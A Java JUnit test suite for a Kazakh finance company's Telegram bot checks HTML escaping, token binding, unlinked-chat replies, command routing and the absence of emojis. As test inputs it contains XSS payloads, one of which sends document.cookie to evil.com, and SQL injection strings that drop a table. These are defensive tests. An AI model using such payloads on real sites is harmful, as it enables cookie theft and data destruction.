package kz.zhanfinance.bot.adversarial;

import kz.zhanfinance.bot.bot.CommandDispatcher;
import kz.zhanfinance.bot.client.BackendClient;
import kz.zhanfinance.bot.client.BackendClientException;
import kz.zhanfinance.bot.client.dto.BindRequest;
import kz.zhanfinance.bot.client.dto.BindResponse;
import kz.zhanfinance.bot.client.dto.ClientProfileDto;
import kz.zhanfinance.bot.client.dto.DocumentSummaryDto;
import kz.zhanfinance.bot.client.dto.TaskSummaryDto;
import kz.zhanfinance.bot.handler.*;
import kz.zhanfinance.bot.service.HtmlMessageFormatter;
import kz.zhanfinance.bot.service.TelegramMessageSender;
import kz.zhanfinance.bot.service.UserSessionCache;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.ArgumentCaptor;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.api.objects.User;
import org.telegram.telegrambots.meta.api.objects.message.Message;

import java.time.Instant;
import java.util.Collections;
import java.util.List;
import java.util.Optional;
import java.util.regex.Pattern;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatNoException;
import static org.mockito.ArgumentMatchers.*;
import static org.mockito.Mockito.*;

@ExtendWith(MockitoExtension.class)
class AdversarialVerificationTest {

    private static final String EMOJI_REGEX = "[\\uD83C-\\uDBFF\\uDC00-\\uDFFF\\u2600-\\u26FF\\u2700-\\u27BF\\uFE00-\\uFE0F\\u200D\\u20E3]";
    private static final Pattern EMOJI_PATTERN = Pattern.compile(EMOJI_REGEX);

    @Mock
    private BackendClient backendClient;

    @Mock
    private TelegramMessageSender messageSender;

    private UserSessionCache sessionCache;
    private StartCommandHandler startHandler;
    private TasksCommandHandler tasksHandler;
    private DocsCommandHandler docsHandler;
    private StatusCommandHandler statusHandler;
    private UnlinkCommandHandler unlinkHandler;
    private HelpCommandHandler helpHandler;
    private CommandDispatcher dispatcher;

    @BeforeEach
    void setUp() {
        sessionCache = new UserSessionCache(5, 500);
        startHandler = new StartCommandHandler(backendClient, sessionCache, messageSender);
        tasksHandler = new TasksCommandHandler(backendClient, sessionCache, messageSender);
        docsHandler = new DocsCommandHandler(backendClient, sessionCache, messageSender);
        statusHandler = new StatusCommandHandler(backendClient, sessionCache, messageSender);
        unlinkHandler = new UnlinkCommandHandler(backendClient, sessionCache, messageSender);
        helpHandler = new HelpCommandHandler(messageSender);

        dispatcher = new CommandDispatcher(
                List.of(startHandler, tasksHandler, docsHandler, statusHandler, unlinkHandler, helpHandler),
                messageSender
        );
    }

    private Update buildUpdate(Long chatId, String text, String username, String firstName, String lastName) {
        Update update = mock(Update.class);
        Message message = mock(Message.class);
        User user = mock(User.class);

        lenient().when(update.hasMessage()).thenReturn(true);
        lenient().when(update.getMessage()).thenReturn(message);
        lenient().when(message.hasText()).thenReturn(text != null);
        lenient().when(message.getText()).thenReturn(text);
        lenient().when(message.getChatId()).thenReturn(chatId);
        lenient().when(message.getFrom()).thenReturn(user);
        lenient().when(user.getUserName()).thenReturn(username);
        lenient().when(user.getFirstName()).thenReturn(firstName);
        lenient().when(user.getLastName()).thenReturn(lastName);

        return update;
    }

    // =========================================================================
    // 1. Adversarial Input Tests on /start [token] (valid, invalid, malformed)
    // =========================================================================

    @Test
    @DisplayName("ADV-START-01: Valid token with unusual user metadata (Cyrillic, special chars, nulls)")
    void startWithValidTokenUnusualMetadata() {
        Update update = buildUpdate(888111L, "/start valid_tok_32char_uuid", "tg_user", "Нұрлан & <Admin>", null);

        when(backendClient.bindTelegram(any(BindRequest.class))).thenReturn(
                new BindResponse(true, 101L, "Нұрлан Әлішерұлы & <Партнеры>", "nurlan@example.kz", "CLIENT")
        );

        dispatcher.dispatch(update);

        ArgumentCaptor<BindRequest> reqCaptor = ArgumentCaptor.forClass(BindRequest.class);
        verify(backendClient).bindTelegram(reqCaptor.capture());
        BindRequest req = reqCaptor.getValue();
        assertThat(req.token()).isEqualTo("valid_tok_32char_uuid");
        assertThat(req.chatId()).isEqualTo(888111L);
        assertThat(req.firstName()).isEqualTo("Нұрлан & <Admin>");

        // Verify session cache
        Optional<ClientProfileDto> cached = sessionCache.get(888111L);
        assertThat(cached).isPresent();
        assertThat(cached.get().fullName()).isEqualTo("Нұрлан Әлішерұлы & <Партнеры>");

        // Verify message sent has HTML escaped properly
        ArgumentCaptor<String> msgCaptor = ArgumentCaptor.forClass(String.class);
        verify(messageSender).sendHtml(eq(888111L), msgCaptor.capture());
        String sentHtml = msgCaptor.getValue();
        assertThat(sentHtml)
                .contains("Аккаунт успешно привязан")
                .contains("Нұрлан Әлішерұлы &amp; &lt;Партнеры&gt;")
                .doesNotContain("<Партнеры>")
                .doesNotContain("Әлішерұлы & ");
    }

    @Test
    @DisplayName("ADV-START-02: Invalid token with backend 400 error containing malicious HTML injection")
    void startWithInvalidTokenHtmlInErrorBody() {
        Update update = buildUpdate(888222L, "/start invalid_or_expired_token", "attacker", "Evil", "User");

        when(backendClient.bindTelegram(any(BindRequest.class)))
                .thenThrow(new BackendClientException(400, "Binding failed: <script>alert('xss')</script> & token expired"));

        dispatcher.dispatch(update);

        ArgumentCaptor<String> msgCaptor = ArgumentCaptor.forClass(String.class);
        verify(messageSender).sendHtml(eq(888222L), msgCaptor.capture());
        String sentHtml = msgCaptor.getValue();

        assertThat(sentHtml)
                .contains("Не удалось привязать аккаунт")
                .contains("&lt;script&gt;alert('xss')&lt;/script&gt; &amp; token expired")
                .doesNotContain("<script>");
        assertThat(sessionCache.get(888222L)).isEmpty();
    }

    @Test
    @DisplayName("ADV-START-03: Malformed tokens - SQL injection, whitespace, extreme length, control characters")
    void startWithMalformedTokens() {
        // SQL injection payload in token without spaces
        String sqlInjectionTokenNoSpace = "'OR'1'='1';DROP/**/TABLE/**/telegram_links;--";
        Update updateSql = buildUpdate(888331L, "/start " + sqlInjectionTokenNoSpace, "user1", "A", "B");
        when(backendClient.bindTelegram(any(BindRequest.class)))
                .thenThrow(new BackendClientException(400, "Invalid token format"));

        dispatcher.dispatch(updateSql);

        ArgumentCaptor<BindRequest> reqCaptor = ArgumentCaptor.forClass(BindRequest.class);
        verify(backendClient).bindTelegram(reqCaptor.capture());
        assertThat(reqCaptor.getValue().token()).isEqualTo(sqlInjectionTokenNoSpace);

        // SQL injection with spaces: verify CommandDispatcher splits arguments safely, so only first token is used
        reset(backendClient);
        when(backendClient.bindTelegram(any(BindRequest.class)))
                .thenThrow(new BackendClientException(400, "Invalid token format"));
        Update updateSqlSpaces = buildUpdate(888332L, "/start ' OR '1'='1'; DROP TABLE telegram_links; --", "user1", "A", "B");
        dispatcher.dispatch(updateSqlSpaces);
        verify(backendClient).bindTelegram(reqCaptor.capture());
        assertThat(reqCaptor.getValue().token()).isEqualTo("'");

        // Extreme length token (5000 chars)
        reset(backendClient);
        when(backendClient.bindTelegram(any(BindRequest.class)))
                .thenThrow(new BackendClientException(400, "Invalid token length"));
        String extremeToken = "A".repeat(5000);
        Update updateExtreme = buildUpdate(888333L, "/start " + extremeToken, "user2", "A", "B");
        dispatcher.dispatch(updateExtreme);
        verify(backendClient).bindTelegram(reqCaptor.capture());
        assertThat(reqCaptor.getValue().token()).isEqualTo(extremeToken);

        // Token with leading/trailing whitespace
        reset(backendClient);
        when(backendClient.bindTelegram(any(BindRequest.class)))
                .thenThrow(new BackendClientException(400, "Invalid token format"));
        Update updateWhitespace = buildUpdate(888334L, "/start    token_with_spaces    ", "user3", "A", "B");
        dispatcher.dispatch(updateWhitespace);
        verify(backendClient).bindTelegram(reqCaptor.capture());
        assertThat(reqCaptor.getValue().token()).isEqualTo("token_with_spaces");
    }

    @Test
    @DisplayName("ADV-START-04: Backend unexpected connection failure during /start does not crash bot")
    void startWithBackendDown() {
        Update update = buildUpdate(888444L, "/start some_token", "user", "Test", null);
        when(backendClient.bindTelegram(any(BindRequest.class)))
                .thenThrow(new RuntimeException("Connection refused: 503 Service Unavailable"));

        assertThatNoException().isThrownBy(() -> dispatcher.dispatch(update));

        verify(messageSender).sendHtml(eq(888444L), contains("Внутренняя ошибка сервиса"));
        assertThat(sessionCache.get(888444L)).isEmpty();
    }

    // =========================================================================
    // 2. Unlinked Chat Handling on /tasks, /docs, /status, /unlink, /help
    // =========================================================================

    @Test
    @DisplayName("ADV-UNLINKED-01: Unlinked chat calling /tasks, /docs, /status receives link prompt without backend query")
    void unlinkedChatCommands() {
        Long unlinkedChatId = 777111L;
        when(backendClient.getClientByChatId(unlinkedChatId)).thenReturn(Optional.empty());

        // 1. /tasks
        Update updateTasks = buildUpdate(unlinkedChatId, "/tasks", "guest", "G", null);
        dispatcher.dispatch(updateTasks);

        // 2. /docs
        Update updateDocs = buildUpdate(unlinkedChatId, "/docs", "guest", "G", null);
        dispatcher.dispatch(updateDocs);

        // 3. /status
        Update updateStatus = buildUpdate(unlinkedChatId, "/status", "guest", "G", null);
        dispatcher.dispatch(updateStatus);

        // Verify prompt sent 3 times
        verify(messageSender, times(3)).sendHtml(eq(unlinkedChatId), contains("Аккаунт не привязан."));

        // Verify no client tasks or documents endpoints were invoked
        verify(backendClient, never()).getClientTasks(anyLong(), anyInt());
        verify(backendClient, never()).getClientDocuments(anyLong(), anyInt());
    }

    @Test
    @DisplayName("ADV-UNLINKED-02: Unlinked chat calling /unlink receives unlinked notification")
    void unlinkedChatUnlinkCommand() {
        Long unlinkedChatId = 777222L;
        when(backendClient.getClientByChatId(unlinkedChatId)).thenReturn(Optional.empty());

        Update update = buildUpdate(unlinkedChatId, "/unlink", "guest", "G", null);
        dispatcher.dispatch(update);

        verify(messageSender).sendHtml(eq(unlinkedChatId), eq("Аккаунт не привязан."));
        verify(backendClient, never()).unlinkByChatId(anyLong());
    }

    @Test
    @DisplayName("ADV-UNLINKED-03: Unlinked chat calling /help receives safe guidance with WhatsApp support link")
    void unlinkedChatHelpCommand() {
        Long unlinkedChatId = 777333L;
        Update update = buildUpdate(unlinkedChatId, "/help", "guest", "G", null);
        dispatcher.dispatch(update);

        ArgumentCaptor<String> msgCaptor = ArgumentCaptor.forClass(String.class);
        verify(messageSender).sendHtml(eq(unlinkedChatId), msgCaptor.capture());
        String helpHtml = msgCaptor.getValue();

        assertThat(helpHtml)
                .contains("Команды бота ЖАН FINANCE:")
                .contains("/tasks")
                .contains("/docs")
                .contains("/status")
                .contains("/unlink")
                .contains("/help")
                .contains("https://wa.me/77750584021");
    }

    @Test
    @DisplayName("ADV-UNLINKED-04: Unlinked chat calling /start without token receives onboarding instructions")
    void unlinkedChatStartWithoutToken() {
        Long unlinkedChatId = 777444L;
        when(backendClient.getClientByChatId(unlinkedChatId)).thenReturn(Optional.empty());

        Update update = buildUpdate(unlinkedChatId, "/start", "guest", "G", null);
        dispatcher.dispatch(update);

        verify(messageSender).sendHtml(eq(unlinkedChatId), contains("Добро пожаловать в ЖАН FINANCE Bot!"));
    }

    @Test
    @DisplayName("ADV-UNLINKED-05: Backend error during client resolution treats as unlinked without crash")
    void unlinkedChatBackendErrorHandling() {
        Long chatId = 777555L;
        // When client resolution throws an unexpected exception, CommandDispatcher catches it safely
        when(backendClient.getClientByChatId(chatId)).thenThrow(new RuntimeException("Connection timed out"));

        Update update = buildUpdate(chatId, "/tasks", "user", "U", null);
        assertThatNoException().isThrownBy(() -> dispatcher.dispatch(update));

        verify(messageSender).sendHtml(eq(chatId), contains("Произошла ошибка при обработке команды"));

        // When client resolution returns Optional.empty() (e.g. 404), user gets link prompt
        reset(messageSender);
        reset(backendClient);
        when(backendClient.getClientByChatId(chatId)).thenReturn(Optional.empty());
        dispatcher.dispatch(update);
        verify(messageSender).sendHtml(eq(chatId), contains("Аккаунт не привязан."));
    }

    @Test
    @DisplayName("ADV-UNLINKED-06: Negative caching does not occur when resolving unlinked chat")
    void unlinkedChatNoNegativeCaching() {
        Long chatId = 777666L;
        when(backendClient.getClientByChatId(chatId)).thenReturn(Optional.empty());

        // First call - unlinked
        sessionCache.resolve(chatId, () -> backendClient.getClientByChatId(chatId));
        assertThat(sessionCache.get(chatId)).isEmpty();

        // Simulate subsequent bind
        ClientProfileDto linkedProfile = new ClientProfileDto(
                true, 88L, "Серик Ахметов", "serik@test.kz", "+77011234567", "ТОО Даму", "CLIENT"
        );
        sessionCache.put(chatId, linkedProfile);

        // Verify subsequent resolution immediately returns linked profile
        Optional<ClientProfileDto> resolved = sessionCache.get(chatId);
        assertThat(resolved).isPresent();
        assertThat(resolved.get().fullName()).isEqualTo("Серик Ахметов");
    }

    // =========================================================================
    // 3. Message Formatting Tests (Malicious HTML, Special Chars, Financial Symbols)
    // =========================================================================

    @Test
    @DisplayName("ADV-HTML-01: HTML escaping handles malicious script/image/iframe injection")
    void htmlEscapingMaliciousPayloads() {
        String xssScript = "<script>alert('pwned')</script>";
        String xssImg = "<img src=\"x\" onerror=\"document.location='http://evil.com?c='+document.cookie\">";
        String xssIframe = "<iframe src=\"javascript:alert(1)\"></iframe>";
        String unclosedBold = "<b>unclosed bold tag & <nested>";

        assertThat(HtmlMessageFormatter.escape(xssScript))
                .isEqualTo("&lt;script&gt;alert('pwned')&lt;/script&gt;");
        assertThat(HtmlMessageFormatter.escape(xssImg))
                .isEqualTo("&lt;img src=\"x\" onerror=\"document.location='http://evil.com?c='+document.cookie\"&gt;");
        assertThat(HtmlMessageFormatter.escape(xssIframe))
                .isEqualTo("&lt;iframe src=\"javascript:alert(1)\"&gt;&lt;/iframe&gt;");
        assertThat(HtmlMessageFormatter.escape(unclosedBold))
                .isEqualTo("&lt;b&gt;unclosed bold tag &amp; &lt;nested&gt;");
    }

    @Test
    @DisplayName("ADV-HTML-02: Financial symbols (₸, ₽, $, €) and Kazakh Cyrillic preserved without corruption")
    void htmlEscapingFinancialAndCyrillic() {
        String input = "Счет: 1 500 000 ₸, Налог: 150 000 ₽, Валюта: $5,000 & €3,200. ТОО «ҚазМұнайӨнімдері»";
        String escaped = HtmlMessageFormatter.escape(input);

        assertThat(escaped)
                .contains("1 500 000 ₸")
                .contains("150 000 ₽")
                .contains("$5,000")
                .contains("€3,200")
                .contains("&amp;")
                .contains("ТОО «ҚазМұнайӨнімдері»")
                .doesNotContain("& ");
    }

    @Test
    @DisplayName("ADV-HTML-03: formatTaskNotification with malicious injection in title and deadline")
    void formatTaskNotificationAdversarial() {
        String formatted = HtmlMessageFormatter.formatTaskNotification(
                "Сдача ФНО 300.00 <script>eval('evil')</script> & 2 000 000 ₸",
                "В работе & <WAITING>",
                "2026-09-30 <URGENT>"
        );

        assertThat(formatted)
                .contains("Сдача ФНО 300.00 &lt;script&gt;eval('evil')&lt;/script&gt; &amp; 2 000 000 ₸")
                .contains("<code>В работе &amp; &lt;WAITING&gt;</code>")
                .contains("2026-09-30 &lt;URGENT&gt;")
                .doesNotContain("<script>")
                .doesNotContain("<WAITING>")
                .doesNotContain("<URGENT>");
    }

    @Test
    @DisplayName("ADV-HTML-04: formatTasksList handles nulls and special characters across all fields")
    void formatTasksListAdversarial() {
        List<TaskSummaryDto> tasks = List.of(
                new TaskSummaryDto(1L, "Задача <A&B>", "В работе & проверка", "IN_PROGRESS", "2026-10-01 <EOM>", "Иван & Петр"),
                new TaskSummaryDto(2L, null, null, null, null, null),
                new TaskSummaryDto(3L, "Оплата 500 000 ₸", "Ожидает <клиента>", "PENDING", "", " ")
        );

        String formatted = HtmlMessageFormatter.formatTasksList(tasks);

        assertThat(formatted)
                .contains("Задача &lt;A&amp;B&gt;")
                .contains("В работе &amp; проверка")
                .contains("2026-10-01 &lt;EOM&gt;")
                .contains("Иван &amp; Петр")
                .contains("Не указан")
                .contains("Оплата 500 000 ₸")
                .contains("Ожидает &lt;клиента&gt;");
    }

    @Test
    @DisplayName("ADV-HTML-05: formatDocumentsList handles malicious file names and null fields")
    void formatDocumentsListAdversarial() {
        List<DocumentSummaryDto> docs = List.of(
                new DocumentSummaryDto(10L, "<script>evil.exe</script>&act.pdf", "application/pdf", 1024L, "SIGNED & VERIFIED", Instant.now()),
                new DocumentSummaryDto(11L, null, null, null, null, null)
        );

        String formatted = HtmlMessageFormatter.formatDocumentsList(docs);

        assertThat(formatted)
                .contains("&lt;script&gt;evil.exe&lt;/script&gt;&amp;act.pdf")
                .contains("SIGNED &amp; VERIFIED")
                .contains("Не указан")
                .doesNotContain("<script>");
    }

    @Test
    @DisplayName("ADV-HTML-06: formatStatus with adversarial client profile fields")
    void formatStatusAdversarial() {
        ClientProfileDto profile = new ClientProfileDto(
                true,
                999L,
                "Алибек <CEO> & Партнеры",
                "alibek+<tag>&test@zhanfinance.kz",
                "+7 777 <000> & 1122",
                "ТОО «Алатау & Ко» 5 000 000 ₸",
                "CLIENT & VIP <GOLD>"
        );

        String formatted = HtmlMessageFormatter.formatStatus(profile, 10, 25);

        assertThat(formatted)
                .contains("Алибек &lt;CEO&gt; &amp; Партнеры")
                .contains("ТОО «Алатау &amp; Ко» 5 000 000 ₸")
                .contains("alibek+&lt;tag&gt;&amp;test@zhanfinance.kz")
                .contains("+7 777 &lt;000&gt; &amp; 1122")
                .contains("CLIENT &amp; VIP &lt;GOLD&gt;")
                .contains("Активных задач:</b> 10")
                .contains("Документов:</b> 25")
                .doesNotContain("<CEO>")
                .doesNotContain("<GOLD>");
    }

    // =========================================================================
    // 4. Verify 0 Emojis in Bot Responses
    // =========================================================================

    @Test
    @DisplayName("ADV-EMOJI-01: Zero emojis in all formatter templates and outputs")
    void verifyZeroEmojisInAllTemplates() {
        List<String> outputs = List.of(
                HtmlMessageFormatter.formatWelcomeLinked("Темирлан"),
                HtmlMessageFormatter.formatWelcomeUnlinked(),
                HtmlMessageFormatter.formatLinkSuccess("Темирлан"),
                HtmlMessageFormatter.formatLinkError("Неверный токен"),
                HtmlMessageFormatter.formatUnlinkSuccess(),
                HtmlMessageFormatter.formatNotLinkedPrompt(),
                HtmlMessageFormatter.formatHelp(),
                HtmlMessageFormatter.formatTaskNotification("Таск 100 ₸", "В работе", "2026-09-30"),
                HtmlMessageFormatter.formatDocumentNotification("Акт 1С.pdf", "SIGNED"),
                HtmlMessageFormatter.formatTasksList(Collections.emptyList()),
                HtmlMessageFormatter.formatDocumentsList(Collections.emptyList()),
                HtmlMessageFormatter.formatStatus(new ClientProfileDto(true, 1L, "Н", "e", "p", "c", "r"), 0, 0),
                "Произошла ошибка при обработке команды. Пожалуйста, попробуйте позже.",
                "Неизвестная команда. Введите /help для просмотра доступных команд.",
                "Аккаунт не привязан.",
                "Не удалось выполнить отвязку аккаунта. Попробуйте позже или обратитесь в поддержку."
        );

        // Standard Unicode Emoji regex covering all supplementary emoji blocks and symbols
        Pattern emojiPattern = Pattern.compile("[\\uD83C-\\uDBFF][\\uDC00-\\uDFFF]|[\\u2600-\\u26FF]|[\\u2700-\\u27BF]");

        for (int i = 0; i < outputs.size(); i++) {
            String output = outputs.get(i);
            java.util.regex.Matcher matcher = emojiPattern.matcher(output);
            if (matcher.find()) {
                System.err.println("EMOJI MATCH FOUND in index " + i + ": '" + matcher.group() + "' hex=" + Integer.toHexString(matcher.group().codePointAt(0)));
            }
            assertThat(matcher.find(0))
                    .as("Template output at index " + i + " contains emojis: '" + output + "'")
                    .isFalse();
        }
    }

    // =========================================================================
    // 5. Command Dispatcher Adversarial Routing & Normalization
    // =========================================================================

    @Test
    @DisplayName("ADV-DISPATCH-01: Case insensitivity and bot username stripping")
    void commandDispatcherCaseAndBotSuffix() {
        Long chatId = 666111L;

        // Uppercase /TASKS@bot
        Update updateUpper = buildUpdate(chatId, "/TASKS@zhan_finance_bot", "u", "F", null);
        when(backendClient.getClientByChatId(chatId)).thenReturn(Optional.empty());
        dispatcher.dispatch(updateUpper);
        verify(messageSender).sendHtml(eq(chatId), contains("Аккаунт не привязан."));

        // Mixed case /DoCs
        Update updateMixed = buildUpdate(chatId, "/DoCs", "u", "F", null);
        dispatcher.dispatch(updateMixed);
        verify(messageSender, times(2)).sendHtml(eq(chatId), contains("Аккаунт не привязан."));

        // Uppercase /HELP
        Update updateHelp = buildUpdate(chatId, "/HELP", "u", "F", null);
        dispatcher.dispatch(updateHelp);
        verify(messageSender).sendHtml(eq(chatId), contains("Команды бота ЖАН FINANCE:"));
    }

    @Test
    @DisplayName("ADV-DISPATCH-02: Non-command and empty updates ignored gracefully")
    void commandDispatcherNonCommandsIgnored() {
        // Plain text message (no leading slash) -> completely ignored, no interaction
        Update plainText = buildUpdate(666222L, "Привет, бот!", "u", "F", null);
        dispatcher.dispatch(plainText);
        verifyNoInteractions(messageSender);

        // Null update or non-text message -> completely ignored
        Update nullTextUpdate = buildUpdate(666222L, null, "u", "F", null);
        dispatcher.dispatch(nullTextUpdate);
        dispatcher.dispatch(null);
        verifyNoInteractions(messageSender);

        // Single slash without command -> treated as unknown command and replies safely
        Update blankSlash = buildUpdate(666222L, "/", "u", "F", null);
        dispatcher.dispatch(blankSlash);
        verify(messageSender).sendHtml(eq(666222L), contains("Неизвестная команда"));
    }
}
